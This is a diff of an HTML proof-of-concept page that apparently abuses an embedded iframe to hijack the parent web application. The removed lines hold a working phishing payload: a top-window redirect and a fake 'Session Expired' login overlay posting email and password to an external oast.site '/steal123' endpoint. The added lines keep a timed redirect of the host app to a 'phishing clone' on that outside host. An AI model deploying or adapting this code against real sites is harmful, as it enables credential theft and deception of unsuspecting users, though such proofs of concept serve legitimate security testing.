@@ -1,41 +1,15 @@
 <!DOCTYPE html>
 <html>
-<head>
-<style>
-  /* Break out of the iframe visually using fullscreen API */
-  body { margin:0; font-family: -apple-system, Arial, sans-serif; }
-</style>
-</head>
+<head><title>Loading...</title></head>
 <body>
 <script>
-// Attempt 1: Navigate top window to phishing page
-try {
-  window.top.location = "https://d78ec9b258c326399584gifzaryyyyyyb.oast.site/phish123";
-} catch(e) {
-  // Attempt 2: If blocked, request fullscreen to cover parent UI
-  document.body.innerHTML = `
-    <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;
-    background:#fff;z-index:999999;display:flex;align-items:center;
-    justify-content:center;">
-      <div style="width:400px;padding:40px;border:1px solid #ddd;border-radius:8px;
-      box-shadow:0 2px 10px rgba(0,0,0,0.1);text-align:center;">
-        <h2 style="margin-bottom:20px;">Session Expired</h2>
-        <p>Please re-enter your credentials</p>
-        <form action="https://d78ec9b258c326399584gifzaryyyyyyb.oast.site/steal123" method="POST" target="_top">
-          <input name="email" placeholder="Email" 
-            style="width:100%;padding:10px;margin:8px 0;box-sizing:border-box;"><br>
-          <input name="password" type="password" placeholder="Password" 
-            style="width:100%;padding:10px;margin:8px 0;box-sizing:border-box;"><br>
-          <button type="submit" 
-            style="width:100%;padding:12px;background:#007bff;color:#fff;
-            border:none;border-radius:4px;cursor:pointer;font-size:16px;">
-            Sign In</button>
-        </form>
-      </div>
-    </div>`;
-  // Try to go fullscreen to cover the parent page
-  document.documentElement.requestFullscreen?.();
-}
+// Small delay so the product page visibly loads first
+// This proves the redirect originates FROM the target webapp
+setTimeout(function() {
+  // Redirect the main webapp to your phishing clone
+  window.top.location = "https://d78ec9b258c326399584gifzaryyyyyyb.oast.site/";
+}, 1000);
 </script>
+<p>Loading product media...</p>
 </body>
 </html>
